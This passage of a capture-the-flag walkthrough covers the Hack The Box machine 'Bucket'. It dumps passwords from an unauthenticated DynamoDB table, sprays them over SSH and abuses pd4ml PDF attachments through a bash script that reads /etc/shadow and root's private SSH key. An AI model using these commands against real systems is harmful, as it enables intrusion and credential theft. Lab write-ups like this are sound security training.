+<p>I had a hard time getting this to work in Firefox, but it worked in Chromium. Others I talked to didn’t have that issue. There are <a href="https://stackoverflow.com/questions/45156215/how-to-fix-a-crc32-error-with-dynamodb-access-from-a-ms-edge-browser">issues with Edge</a>, so it could be some setting in my Firefix.</p>
+<p>The <code class="language-plaintext highlighter-rouge">&lt;/&gt;</code> button will offer a bunch of templates. I’ll pick the one for “List Tables”. Both the params are optional, so I’ll delete them, leaving:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">{};</span>
+<span class="nx">dynamodb</span><span class="p">.</span><span class="nf">listTables</span><span class="p">(</span><span class="nx">params</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="nf">ppJson</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span> <span class="c1">// an error occurred</span>
+    <span class="k">else</span> <span class="nf">ppJson</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span> <span class="c1">// successful response</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>On running this, results are returned (this is where in Firefox I got CRC32 errors):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210422114828245.webp" type="image/webp"/>
+<img alt="image-20210422114828245" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210422114828245.png"/>
+</picture>
+<p>Similarly, it can dump the data using <code class="language-plaintext highlighter-rouge">scan</code>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">TableName</span><span class="p">:</span> <span class="dl">'</span><span class="s1">users</span><span class="dl">'</span><span class="p">,</span>
+<span class="p">}</span>
+<span class="nx">dynamodb</span><span class="p">.</span><span class="nf">scan</span><span class="p">(</span><span class="nx">params</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="nf">ppJson</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span> <span class="c1">// an error occurred</span>
+    <span class="k">else</span> <span class="nf">ppJson</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span> <span class="c1">// successful response</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>Resulting in:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210422115301678.webp" type="image/webp"/>
+<img alt="image-20210422115301678" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210422115301678.png"/>
+</picture>
+<p>It’s worth noting that I was able to access these passwords on DynamoDB without any auth, and so if I did manage to leak a username, or was willing to brute force on via a password spray attack, I could skip the webshell upload entirely and go right to the next step as roy.</p>
+<h3 id="ssh">SSH</h3>
+<p>I’ve got one user, roy, and three passwords. I’ll use <code class="language-plaintext highlighter-rouge">jq</code> to dump the passwords to a file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb scan <span class="nt">--table-name</span> <span class="nb">users</span> | jq <span class="nt">-r</span> <span class="s1">'.Items[].password.S'</span>
+<span class="go">Management@#1@#
+Welcome123!
+n2vM-&lt;_K_Q:.Aa2
+</span><span class="gp">root@kali#</span><span class="w"> </span>aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb scan <span class="nt">--table-name</span> <span class="nb">users</span> | jq <span class="nt">-r</span> <span class="s1">'.Items[].password.S'</span> <span class="o">&gt;</span> passwords
+</code></pre></div></div>
+<p>With that list, I can use <a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> to test them one by one:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>crackmapexec ssh 10.10.10.212 <span class="nt">-u</span> roy <span class="nt">-p</span> passwords 
+<span class="netexec-protocol">SSH </span><span class="go">        10.10.10.212    22     10.10.10.212     </span><span class="netexec-logmessage">[*]</span><span class="go"> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+</span><span class="netexec-protocol">SSH </span><span class="go">        10.10.10.212    22     10.10.10.212     </span><span class="netexec-logfail">[-]</span><span class="go"> roy:Management@#1@# Authentication failed.
+</span><span class="netexec-protocol">SSH </span><span class="go">        10.10.10.212    22     10.10.10.212     </span><span class="netexec-logfail">[-]</span><span class="go"> roy:Welcome123! Authentication failed.
+</span><span class="netexec-protocol">SSH </span><span class="go">        10.10.10.212    22     10.10.10.212     </span><span class="netexec-logsuccess">[+]</span><span class="go"> roy:n2vM-&lt;_K_Q:.Aa2 
+</span></code></pre></div></div>
+<p>The last one works!</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'n2vM-&lt;_K_Q:.Aa2'</span> ssh roy@10.10.10.212
+<span class="go">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)
+...[snip]...
+Last login: Wed Sep 23 03:33:53 2020 from 10.10.14.14
+roy@bucket:~$
+</span></code></pre></div></div>
+<p>I can now grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@bucket:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">2de9f236************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="web-1">Web</h4>
+<p><code class="language-plaintext highlighter-rouge">netstat</code> shows a service listening on 8000 only on localhost (as well as 4566, which I’ll explore in <a href="#beyond-root">Beyond Root</a>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@bucket:/var/www/bucket-app$</span><span class="w"> </span>netstat <span class="nt">-tnl</span>
+<span class="go">Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.1:33555         0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN 
+</span></code></pre></div></div>
+<p>In <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code> it defines both the main site on 80 and the <code class="language-plaintext highlighter-rouge">bucket-app</code> site listening on 8000 only on localhost:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;VirtualHost</span> <span class="err">127.0.0.1:8000</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;IfModule</span> <span class="err">mpm_itk_module</span><span class="nt">&gt;</span>
+                AssignUserId root root
+        <span class="nt">&lt;/IfModule&gt;</span>
+        DocumentRoot /var/www/bucket-app
+<span class="nt">&lt;/VirtualHost&gt;</span>
+
+<span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
+        DocumentRoot /var/www/html
+        RewriteEngine On
+        RewriteCond %{HTTP_HOST} !^bucket.htb$
+        RewriteRule /.* http://bucket.htb/ [R]
+<span class="nt">&lt;/VirtualHost&gt;</span>
+<span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
+        ProxyPreserveHost on
+        ProxyPass / http://localhost:4566/
+        ProxyPassReverse / http://localhost:4566/
+        <span class="nt">&lt;Proxy</span> <span class="err">*</span><span class="nt">&gt;</span>
+                 Order deny,allow
+                 Allow from all
+         <span class="nt">&lt;/Proxy&gt;</span>
+        ServerAdmin webmaster@localhost
+        ServerName s3.bucket.htb
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+<span class="nt">&lt;/VirtualHost&gt;</span>
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">AssignUserId root root</code> means that the application on 8000 is also running as root!</p>
+<p>I’ll reconnect with an SSH tunnel (<code class="language-plaintext highlighter-rouge">-L 8000:localhost:8000</code>). This will start a listener on port 8000 on my VM, and any packets sent to it will be sent through the SSH session and then to localhost port 8000 on Bucket.</p>
+<p>The page just says it’s under construction:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210203164921125.webp" type="image/webp"/>
+<img alt="image-20210203164921125" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210203164921125.png"/>
+</picture>
+<h4 id="source">Source</h4>
+<p>roy can access <code class="language-plaintext highlighter-rouge">bucket-app</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@bucket:/var/www/bucket-app$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 848
+-rw-r-x---+  1 root root     63 Sep 23 02:23 composer.json
+-rw-r-x---+  1 root root  20533 Sep 23 02:23 composer.lock
+drwxr-x---+  2 root root   4096 Sep 23 03:29 files
+-rwxr-x---+  1 root root  17222 Sep 23 03:32 index.php
+-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
+drwxr-x---+ 10 root root   4096 Sep 23 02:23 vendor
+</span></code></pre></div></div>
+<p>At the top of <code class="language-plaintext highlighter-rouge">index.php</code>, there’s some code:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
+<span class="kn">use</span> <span class="nc">Aws\DynamoDb\DynamoDbClient</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span><span class="o">===</span><span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"action"</span><span class="p">]</span><span class="o">===</span><span class="s2">"get_alerts"</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'America/New_York'</span><span class="p">);</span>
+                <span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DynamoDbClient</span><span class="p">([</span>
+                        <span class="s1">'profile'</span> <span class="o">=&gt;</span> <span class="s1">'default'</span><span class="p">,</span>
+                        <span class="s1">'region'</span>  <span class="o">=&gt;</span> <span class="s1">'us-east-1'</span><span class="p">,</span>
+                        <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span><span class="p">,</span>
+                        <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://localhost:4566'</span>
+                <span class="p">]);</span>
+
+                <span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">getIterator</span><span class="p">(</span><span class="s1">'Scan'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
+                        <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="s1">'alerts'</span><span class="p">,</span>
+                        <span class="s1">'FilterExpression'</span> <span class="o">=&gt;</span> <span class="s2">"title = :title"</span><span class="p">,</span>
+                        <span class="s1">'ExpressionAttributeValues'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">":title"</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">"S"</span><span class="o">=&gt;</span><span class="s2">"Ransomware"</span><span class="p">)),</span>
+                <span class="p">));</span>
+
+                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$name</span><span class="o">=</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.html'</span><span class="p">;</span>
+                        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'files/'</span><span class="mf">.</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]);</span>
+                <span class="p">}</span>
+                <span class="nb">passthru</span><span class="p">(</span><span class="s2">"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="nv">$name</span><span class="s2"> 800 A4 -out files/result.pdf"</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>On a POST request with the <code class="language-plaintext highlighter-rouge">action</code> parameter set to “get_alerts”, it will query the DynamoDbClient for alerts that contain “Ransomware” in the title column. For each result, it will create a random filename in <code class="language-plaintext highlighter-rouge">files</code> and write the contents of the data column into that file.</p>
+<p>Then it calls the <a href="https://pd4ml.com/">pd4ml</a> Jar on that temporary HTML file to convert it to PDF.</p>
+<h3 id="test-bucket-app">Test Bucket App</h3>
+<p>To test this, I’ll need to put entries into the database in the table <code class="language-plaintext highlighter-rouge">alerts</code> with a <code class="language-plaintext highlighter-rouge">title</code> that includes the string “Ransomware” and the data I want to see in the <code class="language-plaintext highlighter-rouge">data</code> column.</p>
+<p>I already looked at the local Dynamo in a previous step. There was no table <code class="language-plaintext highlighter-rouge">alerts</code>. I’ll create one. The command <code class="language-plaintext highlighter-rouge">aws dynamodb create-table help</code> and <a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/getting-started-step-1.html">this page</a> provide the syntax:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb create-table <span class="nt">--table-name</span> alerts <span class="nt">--attribute-definitions</span> <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S <span class="nt">--key-schema</span> <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE <span class="nt">--provisioned-throughput</span> <span class="nv">ReadCapacityUnits</span><span class="o">=</span>10,WriteCapacityUnits<span class="o">=</span>5
+<span class="go">{
+    "TableDescription": {
+        "AttributeDefinitions": [
+            {
+                "AttributeName": "title",
+                "AttributeType": "S"
+            },
+            {
+                "AttributeName": "data",
+                "AttributeType": "S"
+            }
+        ],
+        "TableName": "alerts",
+        "KeySchema": [
+            {
+                "AttributeName": "title",
+                "KeyType": "HASH"
+            },
+            {
+                "AttributeName": "data",
+                "KeyType": "RANGE"
+            }
+        ],
+        "TableStatus": "ACTIVE",
+        "CreationDateTime": 1612409699.649,
+        "ProvisionedThroughput": {
+            "LastIncreaseDateTime": 0.0,
+            "LastDecreaseDateTime": 0.0,
+            "NumberOfDecreasesToday": 0,
+            "ReadCapacityUnits": 10,
+            "WriteCapacityUnits": 5
+        },
+        "TableSizeBytes": 0,
+        "ItemCount": 0,
+        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
+    }
+}
+</span></code></pre></div></div>
+<p>The table now shows up in the list:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb list-tables              
+<span class="go">{                      
+    "TableNames": [
+        "alerts",
+        "users"
+    ]
+}
+</span></code></pre></div></div>
+<p>Now I can add an item to the table:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb put-item <span class="nt">--table-name</span> alerts <span class="nt">--item</span> <span class="s1">'{"title":{"S":"Ransomware"},"data":{"S":"This is a test"}}'</span>
+<span class="go">{
+    "ConsumedCapacity": {
+        "TableName": "alerts",
+        "CapacityUnits": 1.0
+    }
+}
+</span></code></pre></div></div>
+<p>And then trigger the page with a <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://127.0.0.1:8000/index.php <span class="nt">--data</span> <span class="s1">'action=get_alerts'</span>
+</code></pre></div></div>
+<p>Back in the shell as roy, two files show up in <code class="language-plaintext highlighter-rouge">files</code> based on the data in the table:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@bucket:/var/www/bucket-app/files$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">5295.html  result.pdf
+</span><span class="gp">roy@bucket:/var/www/bucket-app/files$</span><span class="w"> </span><span class="nb">cat </span>5295.html 
+<span class="go">This is a test
+</span></code></pre></div></div>
+<p>I’ll copy the PDF back with <code class="language-plaintext highlighter-rouge">scp</code>:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'n2vM-&lt;_K_Q:.Aa2'</span> scp roy@10.10.10.212:/var/www/bucket-app/files/result.pdf <span class="nb">.</span>
+</code></pre></div></div>
+<p>It also has my data:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210203223939555.webp" type="image/webp"/>
+<img alt="image-20210203223939555" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210203223939555.png"/>
+</picture>
+<h3 id="file-read">File Read</h3>
+<h4 id="poc">POC</h4>
+<p>In reading about  pd4ml, I found this <a href="https://pd4ml.tech/support-topics/usage-examples/">list of examples</a>. One of them caught my eye - <a href="https://pd4ml.tech/support-topics/usage-examples/#add-attachment">Add Attachment</a>. <a href="https://pd4ml.com/cookbook/pdf-attachments.htm">This page</a> has more examples of tags that can be added. I’ll build a payload that looks like:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;&lt;pd4ml:attachment</span> <span class="na">src=</span><span class="s">"/etc/passwd"</span> <span class="na">description=</span><span class="s">"attachment sample"</span> <span class="na">icon=</span><span class="s">"Paperclip"</span><span class="nt">/&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+<p>The database is constantly being cleared (every minute?), so I may need to recreate the table, and then I’ll add this to it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb put-item <span class="nt">--table-name</span> alerts <span class="nt">--item</span> <span class="s1">'{"title":{"S":"Ransomware"},"data":{"S":"&lt;html&gt;&lt;pd4ml:attachment src=\"/etc/passwd\" description=\"attachment sample\" icon=\"Paperclip\"/&gt;&lt;/html&gt;"}}'</span>
+<span class="go">{
+    "ConsumedCapacity": {
+        "TableName": "alerts",
+        "CapacityUnits": 1.0
+    }
+}
+</span></code></pre></div></div>
+<p>Now I’ll use <code class="language-plaintext highlighter-rouge">curl</code> to trigger it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://127.0.0.1:8000/index.php <span class="nt">--data</span> <span class="s1">'action=get_alerts'</span>
+</code></pre></div></div>
+<p>And get the PDF with <code class="language-plaintext highlighter-rouge">scp</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210204092622819.webp" type="image/webp"/>
+<img alt="image-20210204092622819" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210204092622819.png"/>
+</picture>
+<p>Double clicking on the paperclip pops a prompt to open the file:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210204092705422.webp" type="image/webp"/>
+<img alt="image-20210204092705422" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210204092705422.png"/>
+</picture>
+<p>It worked!</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">tail </span>passwd
+<span class="go">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+roy:x:1000:1000:,,,:/home/roy:/bin/bash
+</span></code></pre></div></div>
+<h4 id="script">Script</h4>
+<p>It got frustrating to work with when the box was clearing the table every minute, so I wrote a script the handle it:</p>
+<div class="language-bash sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+
+<span class="nv">target</span><span class="o">=</span><span class="nv">$1</span>
+
+<span class="c"># delete table</span>
+aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb delete-table <span class="nt">--table-name</span> alerts 2&gt;/dev/null <span class="o">&gt;</span>/dev/null
+<span class="c"># create table</span>
+aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb create-table <span class="nt">--table-name</span> alerts <span class="nt">--attribute-definitions</span> <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S <span class="nt">--key-schema</span> <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH             <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE <span class="nt">--provisioned-throughput</span> <span class="nv">ReadCapacityUnits</span><span class="o">=</span>10,WriteCapacityUnits<span class="o">=</span>5 <span class="o">&gt;</span>/dev/null
+<span class="c"># put entry into table; use commandline arg as target file</span>
+aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb put-item <span class="nt">--table-name</span> alerts <span class="nt">--item</span> <span class="s1">'{"title":{"S":"Ransomware"},"data":{"S":"&lt;html&gt;&lt;pd4ml:attachment src=\"'</span><span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span><span class="s1">'\" description=\"attachment sample\" icon=\"Paperclip\"/&gt;&lt;/        html&gt;"}}'</span> <span class="o">&gt;</span>/dev/null
+<span class="c"># sleep to allow DB to sync</span>
+<span class="nb">sleep </span>0.2
+<span class="c"># trigger PDF generation</span>
+curl <span class="nt">-s</span> http://127.0.0.1:8000/index.php <span class="nt">--data</span> <span class="s1">'action=get_alerts'</span>
+<span class="c"># sleep to allow PDF generation</span>
+<span class="nb">sleep </span>0.2
+<span class="c"># get pdf</span>
+sshpass <span class="nt">-p</span> <span class="s1">'n2vM-&lt;_K_Q:.Aa2'</span> scp roy@10.10.10.212:/var/www/bucket-app/files/result.pdf <span class="nb">.</span>
+
+<span class="c"># extract </span>
+<span class="nv">tfile</span><span class="o">=</span><span class="s2">"/tmp/bucket-pdf-out"</span>
+pdfdetach result.pdf <span class="nt">-save</span> 1 <span class="nt">-o</span> <span class="nv">$tfile</span>
+<span class="nb">cat</span> <span class="nv">$tfile</span>
+<span class="nb">rm</span> <span class="nv">$tfile</span>
+</code></pre></div></div>
+<p>It’s using a tool <code class="language-plaintext highlighter-rouge">pdfdetach</code> from <a href="https://www.xpdfreader.com/pdfdetach-man.html">Xpdf</a> (<code class="language-plaintext highlighter-rouge">apt install xpdf</code>) to pull the attachments out and then show the results.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./get_file.sh /etc/shadow | <span class="nb">tail</span>
+<span class="go">tss:*:18375:0:99999:7:::
+uuidd:*:18375:0:99999:7:::
+tcpdump:*:18375:0:99999:7:::
+landscape:*:18375:0:99999:7:::
+pollinate:*:18375:0:99999:7:::
+sshd:*:18389:0:99999:7:::
+systemd-coredump:!!:18389::::::
+lxd:!:18389::::::
+dnsmasq:*:18521:0:99999:7:::
+roy:$6$R5354aq0yPE29fSL$8O/upWMMuS5VvWFIuIcJT3HutzjaHd7Bk6cmJX4CyYewZh3pQCOJqhQQtvCRhjZzxR5H5efsrbsM1D8naAllp0:18526:0:99999:7:::
+</span></code></pre></div></div>
+<p>One cool thing about these attachments - if I try to attach a directory, it will attach a dir list:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./get_file.sh /var/www/bucket-app
+<span class="go">composer.json
+composer.lock
+files
+index.php
+pd4ml_demo.jar
+vendor
+</span></code></pre></div></div>
+<h3 id="ssh-1">SSH</h3>
+<p>Using the script, I can now enumerate the box as root. In the homedir, there’s the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./get_file.sh /root
+<span class="go">.aws
+.bash_history
+.bashrc
+.cache
+.config
+.java
+.local
+.profile
+.ssh
+backups
+docker-compose.yml
+files
+restore.php
+restore.sh
+root.txt
+snap
+start.sh
+sync.sh
+</span></code></pre></div></div>
+<p>I can grab it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./get_file.sh /root/root.txt
+<span class="go">3ba9e5dd************************
+</span></code></pre></div></div>
+<p>There’s also a <code class="language-plaintext highlighter-rouge">.ssh</code> directory that contains a key pair, and the public key is in the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./get_file.sh /root/.ssh
+<span class="go">authorized_keys
+id_rsa
+id_rsa.pub
+</span><span class="gp">root@kali#</span><span class="w"> </span>./get_file.sh /root/.ssh/authorized_keys
+<span class="go">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHpWmEozLG6uOV2Zvp3LU5KfQP126YUBQJ5KggLCGGyr59p3HbVJRtCv+6eh8quaA0wCGOascKIxqmYPDV1zKPg9I+3Cjoi+tXQa7K7fgtrDURq/2xXWGDMMubz20AHt+HYk3w4H/h23SxbEfHNZ8KYcXkMFZKXF2T4rgfa8n55MDYXFPa14s+Yl3sb2a9qeHVW1y2kI6Lr4Ixy/Ugy90W0EtuJ599MA4XWtIl2zibTQymqrAOJB2A3mCFw65tNeLdxuPP24JMG1c7Z1wt8cCqGphJrt4zTHmnBfngev1I/SomnnLS56tqI52hIkPlKaAF8h8LNQNkAyd17dgZnRDhrzoFWCwPZWXnj72Ggs5gyyJX2DhLvr4+YGK7CL9avG2jLOvf+G0lWYKmb5Z86vhBBnIIUBWjbWwt8ioxw8GqW6vkW+ta1RQIDS6x/H+PjRX+XlYAiKgg5fReZfSSWXV/o/vX538FcBA2/K39o56edp+C/OyPbfDmbiw5ME06AGU= root@ubuntu
+</span><span class="gp">root@kali#</span><span class="w"> </span>./get_file.sh /root/.ssh/id_rsa.pub
+<span class="go">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHpWmEozLG6uOV2Zvp3LU5KfQP126YUBQJ5KggLCGGyr59p3HbVJRtCv+6eh8quaA0wCGOascKIxqmYPDV1zKPg9I+3Cjoi+tXQa7K7fgtrDURq/2xXWGDMMubz20AHt+HYk3w4H/h23SxbEfHNZ8KYcXkMFZKXF2T4rgfa8n55MDYXFPa14s+Yl3sb2a9qeHVW1y2kI6Lr4Ixy/Ugy90W0EtuJ599MA4XWtIl2zibTQymqrAOJB2A3mCFw65tNeLdxuPP24JMG1c7Z1wt8cCqGphJrt4zTHmnBfngev1I/SomnnLS56tqI52hIkPlKaAF8h8LNQNkAyd17dgZnRDhrzoFWCwPZWXnj72Ggs5gyyJX2DhLvr4+YGK7CL9avG2jLOvf+G0lWYKmb5Z86vhBBnIIUBWjbWwt8ioxw8GqW6vkW+ta1RQIDS6x/H+PjRX+XlYAiKgg5fReZfSSWXV/o/vX538FcBA2/K39o56edp+C/OyPbfDmbiw5ME06AGU= root@ubuntu
+</span></code></pre></div></div>
+<p>I’ll grab the private key and get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./get_file.sh /root/.ssh/id_rsa <span class="o">&gt;</span> ~/keys/bucket_root
+<span class="gp">root@kali#</span><span class="w"> </span><span class="nb">chmod </span>600 ~/keys/bucket_root
+<span class="gp">root@kali#</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/bucket_root root@10.10.10.212
